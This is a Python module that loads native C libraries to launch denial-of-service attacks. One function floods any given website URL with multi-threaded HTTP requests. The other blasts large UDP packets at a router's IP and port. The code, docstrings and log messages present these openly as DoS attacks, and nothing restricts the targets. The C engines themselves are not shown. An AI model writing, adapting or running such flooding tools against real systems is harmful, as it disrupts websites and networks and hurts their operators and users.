import multiprocessing
import os
import ctypes
from tqdm import tqdm
import time
from blessed import Terminal

term = Terminal()

LIB_FILE_WIFI = None
C_FILE_WIFI = None

C_FILE_HTTP = None
LIB_FILE_HTTP = None

TERMINAL = None

class TestResult(ctypes.Structure):
    _fields_ = [
        ("total_ok", ctypes.c_int64),
        ("total_err", ctypes.c_int64),
        ("elapsed", ctypes.c_double),
    ]
    
def init(terminal):
    global TERMINAL
    TERMINAL = terminal

def log(msg: str):
    """Safely logs to terminal instance or stdout fallback."""
    if TERMINAL and hasattr(TERMINAL, "_log"):
        TERMINAL._log(msg)
    else:
        print(msg, flush=True)

# C progress callback signature: void callback(int delta)
PROGRESS_CALLBACK = ctypes.CFUNCTYPE(None, ctypes.c_int)

def set_dirs(cfilewifi, libfilewifi, cfilehttp, libfilehttp):
    global LIB_FILE_WIFI, C_FILE_WIFI, C_FILE_HTTP, LIB_FILE_HTTP

    C_FILE_WIFI, LIB_FILE_WIFI, C_FILE_HTTP, LIB_FILE_HTTP = cfilewifi, libfilewifi, cfilehttp, libfilehttp

def DOS_HTTP(target_url: str, total_requests: int, num_threads: int = None):
    """Launches a HTTP/HTTPS DoS attack against an website."""
    
    if num_threads is None:
        num_threads = os.cpu_count() or 4

    needs_recompile = False

    if not LIB_FILE_HTTP or not os.path.exists(LIB_FILE_HTTP):
        needs_recompile = True
    elif os.path.exists(C_FILE_HTTP):
        c_mtime = os.path.getmtime(C_FILE_HTTP)
        dll_mtime = os.path.getmtime(LIB_FILE_HTTP)
        if c_mtime > dll_mtime:  # C code is newer than DLL
            log("[*] Detected changes in fast_packet_http.c!")
            needs_recompile = True

    if needs_recompile:
        log("[!!] FATAL ERROR: The C HTTP engine is outdated or not compiled. Run download_dependencies() first.")
        return

    # FIX 2: Load HTTP DLL, not WiFi DLL
    http_lib = ctypes.CDLL(LIB_FILE_HTTP)

    # Bind argument signature & return structure
    http_lib.run_http_stress_test.argtypes = [
        ctypes.c_char_p,     # const char *url
        ctypes.c_int,        # int total_requests
        ctypes.c_int,        # int num_threads
        PROGRESS_CALLBACK,  # ProgressCallback cb
    ]
    http_lib.run_http_stress_test.restype = TestResult

    actual_total = total_requests

    log(f"[*] Targeting:            {target_url}")
    log(f"[*] Native Threads:       {num_threads}")
    log(f"[*] Total Requests:       {actual_total:,}")
    log(f"[*] Engine:               Native C DLL ({LIB_FILE_HTTP})")

    # Setup tqdm progress bar
    pbar = tqdm(total=actual_total, desc="[*] Progress", unit="req", dynamic_ncols=True)

    def update_progress(delta: int):
        pbar.update(delta)

    # Keep strong reference to callback
    c_progress_cb = PROGRESS_CALLBACK(update_progress)

    start_time = time.time()

    # Invoke native C function
    result = http_lib.run_http_stress_test(
        target_url.encode("utf-8"),
        actual_total,
        num_threads,
        c_progress_cb
    )

    pbar.close()

    elapsed = result.elapsed if result.elapsed > 0 else (time.time() - start_time)
    total_ok = result.total_ok
    total_err = result.total_err
    rps = (total_ok + total_err) / elapsed if elapsed > 0 else 0

    log("\n" + "=" * 50)
    log(f"[+] Finished in:          {elapsed:.2f} seconds")
    log(f"[+] Successful (2xx/3xx): {total_ok:,}")
    log(f"[+] Errors / Failures:    {total_err:,}")
    log(f"[+] Throughput:           {rps:,.2f} Req/Sec")
    log("[!] DoS HTTP Attack execution completed.")

def DOS_WIFI(
    ip: str,
    port: int,
    max_i: int,
    payload_bytes: int
):
    """
    Launches a DoS WiFi attack against a router. (Needs to be connected to router)

    Returns:
        0 = completed normally
        1 = interrupted with Ctrl+C
       -1 = failed to start / incomplete
    """

    # ---------------------------------------------------------
    # Check native library
    # ---------------------------------------------------------

    needs_recompile = False

    if not os.path.exists(LIB_FILE_WIFI):
        needs_recompile = True

    elif os.path.exists(C_FILE_WIFI):
        c_mtime = os.path.getmtime(C_FILE_WIFI)
        lib_mtime = os.path.getmtime(LIB_FILE_WIFI)

        if c_mtime > lib_mtime:
            log("[*] Detected changes in fast_packet_wifi.c!")
            needs_recompile = True

    if needs_recompile:
        log(
            "[!!] FATAL ERROR: The native WIFI engine is "
            "outdated or not compiled. Run download_dependencies() first."
        )
        return -1

    # ---------------------------------------------------------
    # Basic validation
    # ---------------------------------------------------------

    if not ip:
        log("[!] Invalid target IP.")
        return -1

    if port < 1 or port > 65535:
        log("[!] Invalid port.")
        return -1

    if max_i <= 0:
        log("[!] Packet count must be greater than 0.")
        return -1

    if payload_bytes <= 0:
        payload_bytes = 65000

    if payload_bytes > 65506:
        log("[!] UDP payload cannot exceed 65507 bytes.")
        return -1

    # ---------------------------------------------------------
    # Thread count
    # ---------------------------------------------------------

    num_cores = multiprocessing.cpu_count()

    if num_cores < 1:
        num_cores = 1

    # Don't create more workers than packets.
    num_threads = min(num_cores, max_i)

    log(
        f"[+] Launching native C packet engine "
        f"across {num_threads} threads "
        f"({max_i:,} total packets)..."
    )

    # ---------------------------------------------------------
    # Load shared library
    # ---------------------------------------------------------

    try:
        c_lib = ctypes.CDLL(
            LIB_FILE_WIFI,
            use_errno=True
        )
    except OSError as exc:
        log(f"[!] Failed to load WIFI native library: {exc}")
        return -1

    # ---------------------------------------------------------
    # Configure C function
    # ---------------------------------------------------------

    c_lib.start_packet_generator.argtypes = [
        ctypes.c_char_p,   # IP
        ctypes.c_int,      # Port
        ctypes.c_int64,    # TOTAL packets
        ctypes.c_int,      # Threads
        ctypes.c_int       # Payload size
    ]

    c_lib.start_packet_generator.restype = ctypes.c_int

    # ---------------------------------------------------------
    # Execute native engine
    # ---------------------------------------------------------

    try:
        result = c_lib.start_packet_generator(
            ip.encode("utf-8"),
            int(port),
            int(max_i),
            int(num_threads),
            int(payload_bytes)
        )

    except KeyboardInterrupt:
        # Normally the C SIGINT handler catches Ctrl+C first.
        # This is just a fallback.
        log("[!] Keyboard interrupt received.")
        return 1

    # ---------------------------------------------------------
    # Handle C return code
    # ---------------------------------------------------------

    if result == 0:
        log("[+] WiFi DoS attack completed.")

    elif result == 1:
        log("[!] WiFi DoS attack interrupted by user.")

    else:
        log("[!] WiFi DoS attack ended with an error.")

    return result
